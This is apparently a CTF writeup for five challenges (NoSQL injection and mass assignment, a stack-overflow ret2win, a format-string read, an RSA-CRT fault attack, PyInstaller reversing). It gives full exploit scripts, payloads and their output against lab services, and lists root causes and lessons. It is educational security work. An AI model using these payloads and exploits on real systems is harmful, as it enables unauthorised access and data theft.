# CNCC 2026 — CTF Writeups (Challenges 1–5)

Full writeups with proof-of-concept code, reproduction steps, and tooling for five challenges:

| # | Challenge | Category | Flag |
|---|-----------|----------|------|
| 1 | IndigoNotes (note-taking app) | Web — NoSQL Injection + Mass Assignment | `MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}` |
| 2 | SpeedRun | Pwn — Stack overflow / ret2win (PIE leak) | `MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}` |
| 3 | OffTheRecord | Pwn — Format string arbitrary read | `MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}` |
| 4 | TrojanHorse | Crypto/Pwn — Custom protocol + RSA CRT fault (Bellcore) | `MPTC{n3v3r_tru5t_4_p4t13nt_gr33k_b34r1ng_g1ft5}` |
| 5 | nevergonna | Reversing — PyInstaller unpack + XOR-chain cipher | `MPTC{n3v3r_g0nn4_g1v3_y0u_up}` |

---

## Tooling used (global)

- **Recon / HTTP:** `curl`, browser User-Agent spoofing
- **Reversing:** Python 3.11 + [`capstone`](https://www.capstone-engine.org/), [`pyelftools`](https://github.com/eliben/pyelftools), `marshal`+`dis` (for `.pyc`), [`pyinstxtractor`](https://github.com/extremecoders-re/pyinstxtractor)
- **Pwn / scripting:** raw Python `socket`, `struct`, `hashlib`, `openssl`
- **Crypto:** custom Python re-implementations of an ARX permutation / sponge MAC, plus RSA fault-attack math (`math.gcd`, `pow(e,-1,m)`)

```bash
python -m pip install capstone pyelftools
curl -sL https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py -o pyinstxtractor.py
```

---

# Challenge 1 — IndigoNotes (NoSQL Injection + Mass Assignment)

> *"A note-taking app, built in a few days. The boss insisted on PostgreSQL after the fact. The dev SWORE never to use SQL again. Say NO to SQL. IT'S ALREADY SECURED."*

The flavour text ("Say NO to SQL") is literal: the dev swapped PostgreSQL for a **NoSQL** database (MongoDB-style operators), which is injectable.

## Entry point

```bash
curl https://challenges.cncc-2026.xyz/26 -H "Authorization: <CTFd-API-key>"
# -> Your challenge URL is: http://boss-c11fb4f.cncc-2026.xyz
```

The app is a **SvelteKit** front-end with a JSON API.

## Step 1 — WAF / User-Agent bypass

The server blocks `curl`'s User-Agent:

```json
{"status":"kicked-out","message":"Using curl/8.10.1 is what hackers usually use ... GET OUT PEWWWWW!!!"}
```

Spoof a browser UA on every request:

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

## Step 2 — NoSQL authentication bypass

`POST /api/login` accepts JSON and passes it straight into a Mongo-style query. Operator injection bypasses the password check:

```bash
curl -s "$BASE/api/login" -H "User-Agent: $UA" -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# {"success":true}   + Set-Cookie: token=<JWT>
```

The JWT decodes to user `janedoe` (`isAdmin:false`).

## Step 3 — Enumerate users with `$gt` / `$lt`

Comparison operators walk the user collection in order:

```bash
# next user alphabetically after janedoe
-d '{"username":{"$gt":"janedoe"},"password":{"$ne":null}}'   # notadmin
-d '{"username":{"$lt":"janedoe"},"password":{"$ne":null}}'   # dennieisdaneth
-d '{"username":{"$gt":"notadmin"},"password":{"$ne":null}}'  # systemhuh
```

| sub | username | isAdmin |
|-----|----------|---------|
| 1 | janedoe | false |
| 2 | notadmin | false |
| 3 | dennieisdaneth | false |
| 4 | systemhuh | false |

All non-admin — guessing won't help.

## Step 4 — Privilege escalation via Mass Assignment

`PATCH /api/profile` trusts the whole request body, so we set our own `isAdmin`:

```bash
curl -s "$BASE/api/profile" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X PATCH -H "Content-Type: application/json" \
  -d '{"name":"Jane Doe","email":"jane.doe@indigonotes.io","isAdmin":true}'
# {"_id":1,..."isAdmin":true,...}
```

The DB record is now admin, but the existing JWT is stale — **re-login** to mint a fresh admin token:

```bash
-d '{"username":"janedoe","password":{"$ne":null}}'
# new JWT payload: {"sub":1,"username":"janedoe","isAdmin":true,...}
```

## Step 5 — Bypass the flag redaction with operator injection

`GET /api/users` (admin) lists users but redacts the flag-holder:

```json
{"_id":"<REDACTED_USER_EVEN_ADMIN_CANNOT_SEE>", ... "flag":"<REDACTED_USER_EVEN_ADMIN_CANNOT_SEE>"}
```

But `POST /api/users` (the search endpoint) passes the `q` value straight into the query and does **not** apply the redaction. Sending `q` as an **operator object** returns the raw record:

```bash
curl -s "$BASE/api/users" -H "User-Agent: $UA" -H "Cookie: token=$TOKEN" \
  -X POST -H "Content-Type: application/json" -d '{"q":{"$ne":null}}'
```

```json
{"_id":4,"username":"systemhuh", ... ,"flag":"MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}"}
```

### Root causes
- Untyped JSON passed to a NoSQL query → operator injection (auth bypass + enumeration).
- `PATCH /api/profile` mass-assigns `isAdmin` (broken object-property-level authz).
- Output redaction applied on one code path (`GET`) but not the search path (`POST`).

**Flag:** `MPTC{mforst3r1ng_nosql_1nject10n_in_2026_05ad360526c}`

---

# Challenge 2 — SpeedRun (Stack Overflow → ret2win via PIE leak)

> *"A 100-hour RPG with an unskippable tutorial. The speedrunning community took that personally. The timer never sees it coming."*

```
nc 47.128.14.16 1337       # File: speedrun (inside SpeedRun.zip)
```

## Triage

```
ELF 64-bit PIE, NX enabled, Full RELRO, stripped
Imports: open, read, write, puts, printf, _exit ...
```

Static analysis with capstone reveals three key functions:

| Addr | Function | Notes |
|------|----------|-------|
| `0x12a6` | `win()` | `open("flag.txt")` → `read` → `write` "WORLD RECORD ... Flag: ". **No conditions.** |
| `0x1416` | `register_runner()` | reads **exactly 56 bytes** via a bounded loop (`0x139f`); stores a pointer to `main` (`base+0x1532`) at `[rbp-8]`, then `printf("Registered runner: %s")` |
| `0x1484` | `tutorial()` | `read(0, buf[rbp-0x40], 0x100)` — **64-byte buffer, 256-byte read → overflow** |

Offset from `tutorial()`'s buffer to the saved return address = `0x40 + 8 = 72`.

## The PIE problem

A naive **2-byte partial overwrite** (`0x1616` retaddr → `0x12a6` win) fails: the high nibble of byte 1 (bits 12–15) is randomized by PIE, so it needs a 1-in-16 guess *and* the right stack alignment. Brute-forcing all 16 nibbles still failed (alignment-dependent crash in `win`).

## The clean line — leak the PIE base in-band

`register_runner()` reads exactly 56 bytes into a 56-byte buffer and stores `base+0x1532` (a pointer to `main`) right after it, then prints the buffer with `%s`. Sending exactly 56 bytes makes `printf` walk off the end and **leak the text pointer** in the *same connection*:

- `leak = base + 0x1532`  →  `base = leak - 0x1532`  →  `win = base + 0x12a6`

Then overflow `tutorial()` with a full deterministic return address.

## Exploit

```python
import socket, struct, re, sys
HOST, PORT = "47.128.14.16", 1337
WIN_OFF, LEAK_OFF = 0x12a6, 0x1532

def recv_until(s, marker, t=3.0):
    s.settimeout(t); buf=b""
    try:
        while marker not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
    except socket.timeout: pass
    return buf

s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT))
recv_until(s, b"runner tag:")

# Phase 1: leak. 56-byte tag -> printf %s leaks base+0x1532
s.sendall(b"A"*56)
resp = recv_until(s, b"Registered runner:") + recv_until(s, b"\n")
after = resp[resp.find(b"A"*56)+56:]
leak  = struct.unpack("<Q", after.split(b"\n",1)[0][:6].ljust(8,b"\x00"))[0]
base  = leak - LEAK_OFF
win   = base + WIN_OFF
assert base & 0xfff == 0, "bad leak"

# Phase 2: tutorial overflow, offset 72, ret2win
recv_until(s, b"> ")
s.sendall(b"A"*72 + struct.pack("<Q", win))

import time; time.sleep(0.4)
s.settimeout(2.5); out=b""
try:
    while True:
        d=s.recv(4096)
        if not d: break
        out+=d
except socket.timeout: pass

m=re.search(rb"MPTC\{[^}]*\}", out)
print("[+] FLAG:", m.group().decode() if m else out[-200:])
s.close()
```

```
[*] leak=0x6367b375e532  base=0x6367b375d000  win=0x6367b375e2a6
[+] FLAG: MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}
```

**Flag:** `MPTC{sw34ty_p4lms_fr4m3_p3rf3ct_n3w_pb}`

---

# Challenge 3 — OffTheRecord (Format String Arbitrary Read)

> *"A newsroom anonymous tip line, duct-taped together by one intern at 3 a.m. The spicy stuff lands in a drawer stamped do not publish. The intern PROMISED that drawer was locked."*

```
nc 47.128.14.16 1338       # File: off_the_record
```

## Triage

```
ELF 64-bit PIE, NX, stack canary, stripped
Imports: fopen, fgets, printf, strncpy, strtol, fwrite ...
```

Key data layout (from the disassembly):

| Address | Meaning |
|---------|---------|
| `0x42e0` | **flag** buffer — `fgets` from `flag.txt` at startup, but **never printed by any command** |
| `0x4040` | slot array (8 × 64 bytes), index masked `& 7` (no OOB) |
| `0x4260` | encrypted "do-not-publish" memo (XOR `0xb6`) |
| `0x4240` | `published` flag (always 0 → `publish` is "locked") |

Commands: `tip`, `store`, `read`, `unredact`, `publish`, `help`, `quit`.

- `unredact` decrypts the memo (XOR `0xb6`) and prints it **with no credential check** — but it's only a hardcoded decoy (`INTERNAL//DRAFT: source protection list -- DO NOT PUBLISH`), not the flag.
- **The real bug:** the `tip <text>` handler calls `printf(user_text)` with no format string (`@0x1408`) → **format string vulnerability**.

## Exploitation — two-stage arbitrary read

The flag sits at a fixed offset (`0x42e0`) from the PIE base, so we need the base first.

**Stage 1 — leak `main`:** stack slot 110 holds a saved pointer to `main` (`base+0x11c0`). Its low 12 bits match `main`'s file offset, confirming the mapping.

```
tip MK:%110$p   →   base = leak - 0x11c0   →   flag = base + 0x42e0
```

**Stage 2 — `%s` arbitrary read:** my input lands at printf arg 8 (`buf[0:8]`). Put `%11$s` at the start, pad to offset 24, then place the 8-byte flag address there so it becomes arg 11. (The trailing `\x00\x00` of the address doubles as the terminator, so `strncpy` doesn't truncate it — guard against a null in the low 6 bytes with a retry.)

## Exploit

```python
import socket, struct, re, sys
HOST, PORT = "47.128.14.16", 1338
MAIN_OFF, FLAG_OFF = 0x11c0, 0x42e0

def rd(s,t=1.2):
    s.settimeout(t); b=b""
    try:
        while True:
            d=s.recv(4096)
            if not d: break
            b+=d
    except socket.timeout: pass
    return b

def attempt():
    s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT)); rd(s,1.5)
    s.sendall(b"tip MK:%110$p\n"); import time; time.sleep(0.3)
    out=rd(s,1.2)
    m=re.search(rb"MK:(0x[0-9a-f]+)", out)
    if not m: s.close(); return None
    base = int(m.group(1),16) - MAIN_OFF
    flag_addr = base + FLAG_OFF
    if base & 0xfff or b"\x00" in struct.pack("<Q",flag_addr)[:6]:
        s.close(); return None
    payload = b"tip " + b"%11$s".ljust(24, b"A") + struct.pack("<Q", flag_addr)
    s.sendall(payload + b"\n"); time.sleep(0.4)
    out2 = rd(s,1.5); s.sendall(b"quit\n"); s.close()
    return out2

for _ in range(12):                 # ASLR re-rolls each connection
    out = attempt()
    if out and (m := re.search(rb"MPTC\{[^}]*\}", out)):
        print("[+] FLAG:", m.group().decode()); break
```

```
[+] FLAG: MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}
```

### Root causes
- `printf(user_input)` with no format string → format-string read.
- A text pointer (`main`) sits at a predictable stack slot, defeating PIE.

**Flag:** `MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}`

---

# Challenge 4 — TrojanHorse (Custom Crypto Protocol + RSA CRT Fault)

> *"The gates open for no army — but they swing wide every evening for gifts. Bring something shiny, get the keeper's seal on it, waltz right in."*

```
nc 47.128.14.16 1339       # File: trojan (static-pie, stripped)
```

The hardest of the set: a bespoke binary protocol over a length-prefixed wire format, with a homemade cipher/MAC and per-connection RSA. There is **no `flag.txt` string** in the binary (the filename is XOR-obfuscated), and the flag is delivered double-encrypted under the RSA **private** key.

## Wire protocol

`[type:1][len:2 LE][body]`. Server→client bodies are sent raw; client→server bodies are CTR-encrypted.

## Reverse-engineered primitives

| Function | Role |
|----------|------|
| `keysched_a2c0` | 20-round **ARX permutation** (round consts table @ `0xd3180`, `K==CONST[0]`, round const for iter `j` = `CONST[j&7]`) |
| `cipher_a380` | CTR keystream: `permute([counter ^ K0, K1, K2, K3])` → 32 bytes |
| `f_a660` | **Sponge MAC** seeded with the SHA-512 IV words (rate 32, XOR-absorb, `0x01` pad) — the "seal" |
| `f_a800` | CTR cipher whose per-block keystream = `a660(key32 ‖ u32_le(block))` |
| S-box KSA | Fisher–Yates over `0..255` driven by `cipher_a380(0x40000000+blk)`; the wire `type` byte is de-permuted via the inverse S-box to select a command |

### The key leak

The server `read`s 16 bytes from `/dev/urandom`, uses them as `(key0,key1)`, **and sends those same 16 bytes to the client in the startup `0xa0` packet**. The other two key words are hardcoded π digits. The real cipher key is then `permute([key0,key1,π0,π1])` (a one-time `keysched_a2c0` over the 4 words before they're stored as globals).

→ The **entire cipher key and the command S-box are reconstructible** client-side.

### Per-packet counter

`[0x12d520]` is incremented on **every** packet (bodyless commands at `0x9ae1`, body commands at `0x9c3e`). Body keystream base = `((counter + 0x8000) << 14)`. This must be tracked or `S`/`I`/`P` desync after a `K`.

## Protocol client (Python, no external deps)

```python
import socket, struct, time
M=(1<<64)-1
CONST=[0xa1c3e57f9b2d4068,0x37f0d8a6125c9e4b,0x6b9e2c70f5a3148d,0xd24a8f1e0b76c539,
       0x4e8137b0c9d6a25f,0x90b5e3c12f7a8d46,0x1f6cd09a3e85b472,0xc7325a8e16d0f49b]
PI0,PI1=0x243f6a8885a308d3,0x13198a2e03707344
def rol(x,r): x&=M; return ((x<<r)|(x>>(64-r)))&M
def ror(x,r): x&=M; return ((x>>r)|(x<<(64-r)))&M
def permute(s):
    s=list(s)
    for j in range(20):
        rc=CONST[j&7]; s0,s1,s2,s3=s
        a=(s0+s1)&M; d=rol(s3^a,13); c=(s2+d)&M; a=(a+d)&M
        b=rol(s1^c,29); c=rol(c^a,7); c=(c+b)&M; a=ror(a^c,23)
        s=[a,b,c,d]; s[j&3]=(s[j&3]+((j+rc)&M))&M
    return s

IV=[0x510e527fade682d1,0x9b05688c2b3e6c1f,0x1f83d9abfb41bd6b,0x5be0cd19137e2179]
def a660(data):
    st=list(IV); full=(len(data)//32)*32; off=0
    while off<full:
        for w in range(4): st[w]^=struct.unpack('<Q',data[off+w*8:off+w*8+8])[0]
        st=permute(st); off+=32
    rem=data[full:]; pb=bytearray(32); pb[:len(rem)]=rem; pb[len(rem)]=1
    for w in range(4): st[w]^=struct.unpack('<Q',bytes(pb[w*8:w*8+8]))[0]
    return b''.join(struct.pack('<Q',x) for x in permute(st))
def a800ks(key32,n):
    o=bytearray(); b=0
    while len(o)<n: o+=a660(key32+struct.pack('<I',b)); b+=1
    return bytes(o[:n])

class Proto:
    def __init__(self,k0,k1):
        self.K0,self.K1,self.K2,self.K3=permute([k0,k1,PI0,PI1]); self.pkt=0
        self._sbox()
    def cipher(self,c):
        s=permute([(c^self.K0)&M,self.K1,self.K2,self.K3])
        return b''.join(struct.pack('<Q',x) for x in s)
    def _sbox(self):
        S=list(range(256)); ks=[]; blk=0
        def kb():
            nonlocal ks,blk
            if not ks: ks=list(self.cipher((0x40000000+blk)&0xffffffff)); blk+=1
            return ks.pop(0)
        for i in range(255,0,-1):
            j=kb()%(i+1); S[i],S[j]=S[j],S[i]
        self.S=S
    def wt(self,c): return self.S[c]
    def enc(self,plain,ctr):
        base=((ctr+0x8000)<<14)&0xffffffff; out=bytearray(plain); blk=base; off=0
        while off<len(plain):
            ks=self.cipher(blk&0xffffffff); blk+=1
            for k in range(min(32,len(plain)-off)): out[off+k]^=ks[k]
            off+=32
        return bytes(out)
    def cmd(self,s,c,body=b''):
        if body: s.sendall(bytes([self.wt(c)])+struct.pack('<H',len(body))+self.enc(body,self.pkt))
        else:    s.sendall(bytes([self.wt(c)])+b'\x00\x00')
        self.pkt+=1; time.sleep(0.25); return read_pkt(s)

def recv_n(s,n,t=4):
    s.settimeout(t); b=b''
    while len(b)<n:
        d=s.recv(n-len(b))
        if not d: break
        b+=d
    return b
def read_pkt(s):
    h=recv_n(s,3)
    if len(h)<3: return None,None
    return h[0], recv_n(s, h[1]|(h[2]<<8))
def connect():
    s=socket.socket(); s.settimeout(6); s.connect(("47.128.14.16",1339))
    buf=b''; s.settimeout(3)
    try:
        while len(buf)<0x105+19: buf+=s.recv(4096)
    except: pass
    i=buf.find(b'\xa0\x10\x00'); key=buf[i+3:i+3+16]
    return s, Proto(struct.unpack('<Q',key[:8])[0], struct.unpack('<Q',key[8:16])[0])
```

## The flag mechanism (startup, `a910`)

- Filename is XOR-obfuscated: `rodata[0xd3048] ^ 0xa1 == "flag.txt"` (why string search misses it).
- The flag is read, then **`a800`-encrypted** with `MAC2 = a660(d ‖ "FLAGSEAL")` where `d` is the **RSA private exponent** (`d = e⁻¹ mod λ(n)`), and stored at `0x12d2a0`.
- The `P` command copies that ciphertext and adds a **second** `a800` layer keyed by `MAC_P = a660(body ‖ "FLAGSEAL")` (which we control), then sends it.

So: `P_response = a800(MAC_P, a800(MAC2(d), flag))`. We can peel the outer layer immediately; the inner layer needs `d`.

## Recovering `d` — Bellcore CRT fault

`S` is a raw CRT signing oracle: `sig = m^d mod n`. The attacker-controlled `data2`/`K` field sits next to the CRT parameters; sending a long `K` corrupts one CRT half → a faulty signature `sig'` with `gcd(sig'^e − m, n) = p`.

```python
from math import gcd
e=0x10001
s,p=connect()
_,bk=p.cmd(s,0x4b); N=int.from_bytes(bk[:128],'big')         # K -> modulus
L,K,m=16,56,2
_,out=p.cmd(s,0x53, struct.pack('<H',L)+m.to_bytes(L,'big')+struct.pack('<H',K)+b'\xff'*K)
sig=int.from_bytes(out,'big'); pf=gcd((pow(sig,e,N)-m)%N, N)  # FAULT -> factor!
qf=N//pf
```

Then derive `d` and peel both `a800` layers:

```python
def lcm(a,b): return a*b//gcd(a,b)
_,ctP=p.cmd(s,0x50,b'\x00'*0x80)                  # P ciphertext
inner=bytes(ctP[i]^a800ks(a660(b'\x00'*0x80+b'FLAGSEAL'),len(ctP))[i] for i in range(len(ctP)))
d=pow(e,-1,lcm(pf-1,qf-1))
mac2=a660(d.to_bytes(128,'big')+b'FLAGSEAL')
flag=bytes(inner[i]^a800ks(mac2,len(ctP))[i] for i in range(len(ctP)))
print(flag)
```

```
factored: True
FLAG: MPTC{n3v3r_tru5t_4_p4t13nt_gr33k_b34r1ng_g1ft5}
```

### Kill chain summary
1. Key leak in startup packet → reconstruct cipher + command S-box → working client.
2. `K` → RSA modulus; trace keygen → flag is `a800(MAC(d), flag)`.
3. `S` CRT signing oracle + long `K` → faulty signature → `gcd` factors `n`.
4. `p,q → d → MAC2`, peel `P` layer + startup layer → flag.

**Flag:** `MPTC{n3v3r_tru5t_4_p4t13nt_gr33k_b34r1ng_g1ft5}`

---

# Challenge 5 — nevergonna (PyInstaller Unpack → XOR-chain cipher)

> *"A 'friend' hands you a program and swears you already know the password. You do not. Crack it open :)"*

A 17 MB stripped ELF — a **PyInstaller** bundle (the name is a Rickroll).

## Step 1 — Unpack

```bash
curl -sL https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py -o pyinstxtractor.py
python pyinstxtractor.py nevergonna
# [+] Python version: 3.11 ... extracts never_gonna.pyc
```

## Step 2 — Disassemble the bytecode

The `.pyc` magic `a70d0d0a` = Python 3.11. With a matching interpreter you can `marshal.loads` + `dis` directly (no decompiler needed):

```python
import marshal, dis
code = marshal.loads(open("never_gonna.pyc","rb").read()[16:])
dis.dis(code)
```

## Step 3 — The cipher

Reconstructed logic:

```python
SEED    = b'never_gonna_give_you_up'
ENCODED = 'S8Nny9a0FG5R9kr2BfGi14VnrXJVCkyk4MVJYBw='
ROLL    = 75

def derive_key(n):
    d = hashlib.sha256(SEED).digest()
    return bytes(d[i % len(d)] for i in range(n))

def transform(raw):                       # out[i] = raw[i] ^ key[i] ^ prev
    key = derive_key(len(raw))            # prev starts at ROLL, then = out[i-1]
    out = bytearray(len(raw)); prev = ROLL
    for i in range(len(raw)):
        out[i] = (raw[i] ^ key[i] ^ prev) & 255
        prev = out[i]
    return bytes(out)

def check(candidate):                     # transform(password) == b64decode(ENCODED)
    target = base64.b64decode(ENCODED)
    raw = candidate.encode()
    return len(raw) == len(target) and transform(raw) == target
```

Because `prev` is just the previous **ciphertext** byte (known), the chain inverts in one pass.

## Step 4 — Invert

```python
import base64, hashlib
SEED=b'never_gonna_give_you_up'; ROLL=75
target=base64.b64decode('S8Nny9a0FG5R9kr2BfGi14VnrXJVCkyk4MVJYBw=')
d=hashlib.sha256(SEED).digest()
key=bytes(d[i%len(d)] for i in range(len(target)))
raw=bytearray(len(target)); prev=ROLL
for i in range(len(target)):
    raw[i]=target[i]^key[i]^prev
    prev=target[i]
print(bytes(raw).decode())     # the password IS the flag (program echoes it)
```

```
MPTC{n3v3r_g0nn4_g1v3_y0u_up}
```

**Flag:** `MPTC{n3v3r_g0nn4_g1v3_y0u_up}`

---

## Lessons / takeaways

- **#1** Never feed untyped JSON to a (No)SQL query; enforce object-property-level authz; apply output filtering on *every* path.
- **#2** A single in-band text-pointer leak defeats PIE — partial overwrites aren't the only option.
- **#3** `printf(user)` is always game over; one predictable stack pointer is enough to leak the base.
- **#4** Rolling your own crypto + a CRT signing oracle = Bellcore fault → instant RSA factorization.
- **#5** PyInstaller is just a zip; bytecode disassembly beats fighting decompilers; reversible ciphers invert trivially.
